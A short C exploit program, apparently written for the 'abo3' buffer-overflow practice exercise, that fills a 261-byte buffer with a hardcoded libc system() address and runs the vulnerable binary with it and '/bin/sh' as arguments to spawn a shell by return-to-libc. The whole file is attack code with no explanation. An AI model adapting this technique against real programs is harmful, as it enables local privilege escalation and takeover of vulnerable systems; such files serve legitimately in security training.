#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUF  261 // 256 + 4 + 1
#define SYSTEM 0xf7e50190
#define SHELL "/bin/sh"

int main(){
	char buf[BUF];
	char *argv[4];
	
	int *ap= (int) buf;
	int i , system_addr = SYSTEM;

	printf("uso system address: 0x%x \n", system_addr);
	for(i=0; i<BUF-1;i+=4){
		*ap++ = system_addr;
	}
	*ap = 0x0;
	
	argv[0] = "./abo3";
	argv[1] = buf;
	argv[2] = SHELL;
	argv[3] = NULL;
	
	execve(argv[0], argv, NULL);
	perror("execve");
}
